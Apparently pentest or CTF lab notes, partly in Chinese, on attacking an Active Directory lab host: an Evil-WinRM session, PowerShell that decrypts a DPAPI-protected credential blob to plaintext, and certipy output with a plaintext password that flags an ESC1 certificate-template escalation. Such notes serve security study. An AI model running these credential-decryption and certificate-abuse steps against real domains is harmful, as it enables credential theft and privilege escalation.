*Evil-WinRM* PS C:\Users\tracy.white\Documents> cat automation.txt  
Enrollment Automation Account  
  
01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b

  

create a file with content, use cmd or pwsh

```PowerShell
new-item -path . -name "jaa.txt" -itemtype "file"
```

```PowerShell
type nul > hah.txt
```

```PowerShell
echo 01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b > creds.txt
```

or

```PowerShell
"01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e
44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a00
0000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df486
3a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b" | Out-File -FilePath creds.txt
```

```PowerShell
Set-Content -Path .\creds.txt -Value '01000000d08c9ddf0115d1118c7
a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2
526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47c
d2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b'
```

  
  
*Evil-WinRM* PS C:\Users\tracy.white\Documents>  
*Evil-WinRM* PS C:\Users\tracy.white\Documents>

### **What is** `**BSTR**`**?**

- `*BSTR**` stands for **Basic String** or **Binary String**, and it's a string data type used in **COM (Component Object Model)** programming, primarily in Windows environments.

```PowerShell
$pw = Get-Content .\creds.txt | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$UnsecurePassword
```

cat automation.txt  
Enrollment Automation Account

01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b

  

is a **DPAPI-encrypted blob** (Data Protection API) used in Windows systems.

### **Can it be decrypted?**

Yes, but **only under specific conditions**:

- You must be running as the **same user** who encrypted it.
- On the **same machine** (unless machine-level encryption was used).
- You can decrypt it using PowerShell:

A typical **DPAPI-encrypted string** (especially from PowerShell's `ConvertFrom-SecureString`) has these characteristics:

- It is a **long hexadecimal string**.
- It usually **starts with** `**01000000**`, which is a common header for DPAPI blobs.
- It contains **only hexadecimal characters** (0–9, a–f).
- It is often **around 200–300 characters long**, depending on the original data.

  

```PowerShell
 certipy find -u "TRACY.WHITE" -p 'zqwj041FGX' -dc-ip 192.168.190.30 -stdout -vulnerable

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'NARA-CA' via CSRA
[!] Got error while trying to get CA configuration for 'NARA-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'NARA-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'NARA-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : NARA-CA
    DNS Name                            : Nara.nara-security.com
    Certificate Subject                 : CN=NARA-CA, DC=nara-security, DC=com
    Certificate Serial Number           : 2401E520F70B7DA34C32FABC71D89E1D
    Certificate Validity Start          : 2023-07-30 14:06:05+00:00
    Certificate Validity End            : 2123-07-30 14:16:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : NARA-SECURITY.COM\Administrators
      Access Rights
        ManageCertificates              : NARA-SECURITY.COM\Administrators
                                          NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
        ManageCa                        : NARA-SECURITY.COM\Administrators
                                          NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
        Enroll                          : NARA-SECURITY.COM\Authenticated Users
Certificate Templates
  0
    Template Name                       : NaraUser
    Display Name                        : NaraUser
    Certificate Authorities             : NARA-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : UserInteractionRequired
                                          PublishToDs
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Domain Users
                                          NARA-SECURITY.COM\Enterprise Admins
      Object Control Permissions
        Owner                           : NARA-SECURITY.COM\Administrator
        Full Control Principals         : NARA-SECURITY.COM\Enrollment
        Write Owner Principals          : NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
                                          NARA-SECURITY.COM\Administrator
                                          NARA-SECURITY.COM\Enrollment
        Write Dacl Principals           : NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
                                          NARA-SECURITY.COM\Administrator
                                          NARA-SECURITY.COM\Enrollment
        Write Property Principals       : NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
                                          NARA-SECURITY.COM\Administrator
                                          NARA-SECURITY.COM\Enrollment
    [!] Vulnerabilities
      ESC1                              : 'NARA-SECURITY.COM\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

- 表示 **Enterprise Security Certificate Vulnerability #1**
- 是 Active Directory 证书服务（AD CS）中最常见、最危险的一个提权漏洞
- 详细信息参考 SpecterOps ESC1 文档

  

  

## 原因分析如下：

### 📄 1. **文件名和内容线索：**`**automation.txt**`

你看到的文件内容中，明确写了：

```Plain

Enrollment Automation Account
01000000d08c9ddf0115d1118c7a00c04fc297eb...
```

这说明：

- 这个文件可能是自动化脚本中使用的凭证（比如自动执行证书申请任务）
- 明确提到 “Enrollment”，说明这个账号是 **跟证书注册相关的账号**

---

### 🧠 2. **实际企业环境中的设计逻辑**

在企业环境中，证书注册通常需要特定权限：

- 比如有个 AD 安全组叫做：`Enrollment`, `CertEnroll`, `Certificate Admins` 等
- 管理员会把负责证书申请的自动化账号（比如脚本或服务使用的账号）加入这些组中，赋予权限

所以：你看到名字里有 “Enrollment” 的密文 + 发现存在 `Enrollment` 权限组或相关用户

👉 **很合理地推测：这个加密密码属于这些人中之一**